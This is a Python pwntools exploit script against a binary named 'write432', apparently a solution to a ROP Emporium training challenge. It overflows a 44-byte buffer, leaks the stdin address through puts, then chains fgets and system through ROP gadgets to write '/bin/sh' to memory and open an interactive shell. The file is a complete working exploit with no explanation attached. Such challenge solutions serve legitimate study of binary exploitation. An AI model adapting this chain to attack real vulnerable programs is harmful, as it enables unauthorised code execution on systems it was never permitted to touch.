#!/usr/bin/python2

from pwn import *
import sys

BINARY = "./write432"
e=ELF(BINARY,checksec=False)

def stage1():
    main=0x804857B 

    sc='A'*44

    sc+=p32(e.plt['puts'])
    sc+=p32(main)
    sc+=p32(0x804a060)

    return sc

def stage2(stdin):
    
    waddr=0x804a044
    add8pop=0x080483de

    sc='A'*44
    sc+=p32(e.plt['fgets'])
    sc+=p32(add8pop)
    sc+=p32(waddr)
    sc+=p32(8)
    sc+=p32(stdin)
    sc+=p32(e.plt['system'])
    sc+=p32(0x80485D9)
    sc+=p32(waddr)
    return sc

def exploit(r):
    r.recvuntil('> ')
    r.sendline(stage1())
    stdin=u32(r.recv(4))
    log.success("Leaked STDIN address:"+hex(stdin))
    
    r.recvuntil('> ')
    r.sendline(stage2(stdin))

    r.sendline('/bin/sh\x00')

    log.success("Got Shell, let's roll")
    r.interactive()

if __name__=="__main__":

    r = process(BINARY)
    exploit(r)